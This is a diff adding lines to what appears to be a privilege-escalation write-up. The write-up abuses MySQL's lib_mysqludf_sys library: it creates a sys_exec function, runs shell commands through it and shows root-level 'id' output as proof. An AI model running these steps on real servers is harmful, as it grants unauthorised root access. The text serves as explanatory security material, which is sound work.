@@ -60,6 +60,12 @@ that we are logged as user "npn" and execute `mysql -u root`:
 - mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_.so';
 - mysql> select sys_exec('id > /tmp/out; chown npn.npn /tmp/out');
 
+From our shell we should cat the /tmp/out file and we should have:
+* npn@pwn:~$ cat /tmp/out
+* uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
+
+This means that it works and we can now `sys_exec` our commands.
+
 Note that to it returned some errors sometimes i just modified the
 procedure in GNU/Linux to cover any eventual failure, we can reproduce
 the steps on windows.
